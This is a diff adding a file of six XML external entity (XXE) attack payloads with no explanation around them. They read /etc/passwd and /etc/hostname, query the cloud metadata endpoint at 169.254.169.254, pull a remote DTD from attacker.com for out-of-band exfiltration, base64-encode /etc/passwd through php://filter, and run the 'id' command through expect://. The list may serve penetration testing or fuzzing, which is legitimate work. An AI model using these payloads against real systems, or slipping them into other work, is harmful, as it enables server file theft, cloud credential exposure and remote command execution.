@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
+  %remote;
+]>
+<foo>&send;</foo>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<foo>&xxe;</foo>
